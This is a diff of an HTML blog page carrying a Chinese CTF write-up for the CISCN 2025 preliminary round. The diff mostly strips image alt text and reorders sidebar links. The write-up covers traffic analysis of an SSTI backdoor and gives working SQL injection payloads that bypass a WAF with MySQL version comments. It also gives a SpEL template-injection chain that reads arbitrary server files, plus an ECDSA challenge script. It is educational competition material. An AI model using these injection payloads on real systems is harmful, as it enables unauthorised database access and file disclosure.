@@ -620,17 +620,17 @@
     <article class="post post-detail">
       <div class="post-content">
         <h1 id="ciscn-2025-初赛-WP-by-Yp0int"><a href="#ciscn-2025-初赛-WP-by-Yp0int" class="headerlink" title="ciscn 2025 初赛 WP by Yp0int"></a>ciscn 2025 初赛 WP by Yp0int</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="SnakeBackdoor1"><a href="#SnakeBackdoor1" class="headerlink" title="SnakeBackdoor1"></a>SnakeBackdoor1</h3><p>_ws.col.info &#x3D;&#x3D; “POST &#x2F;admin&#x2F;login HTTP&#x2F;1.1  (application&#x2F;x-www-form-urlencoded)”追踪爆破流的最后一个，为zxcvbnm123</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228151755150.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228151755150.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228151755150"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228151755150.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228151755150.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>登录后重定向到了&#x2F;admin&#x2F;panel</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152234688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152234688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228152234688"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152234688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152234688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>在这个路由先探测了一下ssti</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152439747.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152439747.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228152439747"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152439747.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152439747.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>追踪这条流有ssti的payload</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152534714.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152534714.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228152534714"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152534714.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152534714.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>拿去Base64解码看到是zlib文件</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152720423.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152720423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228152720423"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152720423.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228152720423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="SnakeBackdoor2"><a href="#SnakeBackdoor2" class="headerlink" title="SnakeBackdoor2"></a>SnakeBackdoor2</h3><p>前面找到，跟进其相应包，里面有secret-key</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228165255152.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228165255152.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228165255152"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228165255152.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228165255152.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="AI-WAF"><a href="#AI-WAF" class="headerlink" title="AI_WAF"></a>AI_WAF</h3><p>利用&#x2F;<em>!50000</em>&#x2F;绕过关键字</p>
 <p>获取表名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  /*!50000union*/ /*!50000select*/ 1,2,/*!50000group_concat(table_name)*/ from /*!50000information_schema.tables*/ where /*!50000table_schema*/=\&quot;nexadata\&quot;  -- -</span><br></pre></td></tr></table></figure>
@@ -661,12 +661,12 @@
 <p>其实就是类似fastjson 1.2.68 commons-io写文件</p>
 <p>题目说了禁用全部命令，让读文件</p>
 <p>copyToString可以接收InputStream，返回成字符。重要的是他是static方法</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163010585.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163010585.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228163010585"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163010585.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163010585.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>那么可以构造如下去调用copyToString</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123;&#x27;&#x27;.getClass.forName(&quot;org.springframework.util.StreamUtils&quot;).getMethod(&quot;copyToString&quot;, &#x27;&#x27;.getClass.forName(&quot;java.io.InputStream&quot;), &#x27;&#x27;.getClass.forName(&quot;java.nio.charset.Charset&quot;))&#125;]]</span><br></pre></td></tr></table></figure>
 
 <p>刚好URI有一个static方法create，避免了调用构造函数</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163528548.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163528548.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228163528548"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163528548.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228163528548.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>#strings是spEL的内置表达式，不然直接用String类不能传字符串。加入toURL().openStream()转为InputStream</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.getClass.forName(&quot;java.net.URI&quot;).getMethod(&quot;create&quot;, &#x27;&#x27;.getClass.forName(&quot;java.lang.String&quot;)).invoke(null, #strings.concat(&quot;file:///&quot;)).toURL().openStream()</span><br></pre></td></tr></table></figure>
 
@@ -677,10 +677,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123;&#x27;&#x27;.getClass.forName(&quot;org.springframework.util.StreamUtils&quot;).getMethod(&quot;copyToString&quot;, &#x27;&#x27;.getClass.forName(&quot;java.io.InputStream&quot;), &#x27;&#x27;.getClass.forName(&quot;java.nio.charset.Charset&quot;)).invoke(null, &#x27;&#x27;.getClass.forName(&quot;java.net.URI&quot;).getMethod(&quot;create&quot;, &#x27;&#x27;.getClass.forName(&quot;java.lang.String&quot;)).invoke(null, #strings.concat(&quot;file:///&quot;)).toURL().openStream(), &#x27;&#x27;.getClass.forName(&quot;java.nio.charset.StandardCharsets&quot;).getField(&quot;UTF_8&quot;).get(null))&#125;]]</span><br></pre></td></tr></table></figure>
 
 <p>列目录</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162324516.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162324516.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228162324516"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162324516.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162324516.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>flag_y0u_d0nt_kn0w</p>
 <p>flag被过滤了，concat直接绕过就行了</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162856254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162856254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251228162856254"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162856254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251228162856254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SigningKey, NIST521p</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">digest_int = <span class="built_in">int</span>.from_bytes(sha512(<span class="string">b&quot;Welcome to this challenge!&quot;</span>).digest(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">curve_order = NIST521p.order</span><br><span class="line">priv_int = digest_int % curve_order</span><br><span class="line">priv_bytes = long_to_bytes(priv_int, <span class="number">66</span>)</span><br><span class="line">sk = SigningKey.from_string(priv_bytes, curve=NIST521p)</span><br><span class="line">vk = sk.verifying_key</span><br><span class="line"></span><br><span class="line">f_pub = <span class="built_in">open</span>(<span class="string">&quot;public.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f_pub.write(vk.to_pem())</span><br><span class="line">f_pub.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nonce</span>(<span class="params">i</span>):</span><br><span class="line">    seed = sha512(<span class="string">b&quot;bias&quot;</span> + <span class="built_in">bytes</span>([i])).digest()</span><br><span class="line">    k = <span class="built_in">int</span>.from_bytes(seed, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line">msgs = [<span class="string">b&quot;message-&quot;</span> + <span class="built_in">bytes</span>([i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>)]</span><br><span class="line">sigs = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(msgs):</span><br><span class="line">    k = nonce(i)</span><br><span class="line">    sig = sk.sign(msg, k=k)</span><br><span class="line">    sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))</span><br><span class="line"></span><br><span class="line">f_sig = <span class="built_in">open</span>(<span class="string">&quot;signatures.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> m, s <span class="keyword">in</span> sigs:</span><br><span class="line">    f_sig.write(<span class="string">&quot;%s:%s\n&quot;</span> % (m, s))</span><br><span class="line">f_sig.close()</span><br></pre></td></tr></table></figure>
 
 <p>注意私钥产生的方式</p>
@@ -1072,6 +1072,27 @@ ODDFUZZ: Disco
             
 
             <div class="post-img-box">
+              <a href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-18</span>
+                
+              </div>
+              <a class="post-title" href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/">一些奇怪的姿势和场景杂烩</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2026/05/01/rhino-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1147,27 +1168,6 @@ ODDFUZZ: Disco
                 
               </div>
               <a class="post-title" href="/2026/03/19/alictf-2025-web-java/">Alictf 2026 javaweb</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2026/03/13/wo-de-an-quan-mian-shi-just-shi-xi/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8192.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8192.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">03-13</span>
-                
-              </div>
-              <a class="post-title" href="/2026/03/13/wo-de-an-quan-mian-shi-just-shi-xi/">我的安全面试——实习</a>
             </div>
           </div>
         
